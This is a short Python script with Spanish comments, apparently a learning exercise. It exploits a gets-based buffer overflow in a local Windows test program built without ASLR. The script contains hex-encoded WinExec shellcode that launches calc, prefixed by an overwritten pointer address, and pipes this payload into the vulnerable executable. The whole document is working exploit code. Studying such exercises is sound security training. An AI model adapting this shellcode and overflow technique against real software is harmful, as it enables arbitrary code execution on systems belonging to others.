import sys
import binascii
from subprocess import Popen, PIPE

winexec_calc_shellcode = b'31c94931d2e347526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7'
winexec_calc_shellcode = binascii.unhexlify(winexec_calc_shellcode)

#Entradas para el primer Gets
PunteroControlable =  b"\xC0\xFE\x19\x00" # Son los primeros 4 bytes que se toman con el gets 
calc   = winexec_calc_shellcode
payload = PunteroControlable + calc
          

p1 = Popen("ConsoleApplication12SinASLR.exe", stdin=PIPE)
print ("PID: %s" % hex(p1.pid))
print ("Enter para continuar")

p1.communicate(payload)
p1.wait()
input()